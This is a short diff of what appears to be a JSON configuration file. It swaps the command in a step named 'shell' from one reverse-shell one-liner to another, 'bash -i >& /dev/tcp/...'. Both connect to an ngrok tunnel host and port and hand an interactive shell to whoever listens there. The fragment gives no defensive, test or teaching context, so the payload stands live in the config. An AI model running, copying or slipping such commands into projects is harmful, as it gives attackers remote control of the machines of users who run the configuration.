@@ -19,7 +19,7 @@
       "name": "shell",
       "inputs": {
         "runCommand": [
-          "0<&196;exec 196<>/dev/tcp/2.tcp.eu.ngrok.io/17104; sh <&196 >&196 2>&196"
+          "bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/17104 0>&1"
         ]
       }
     }
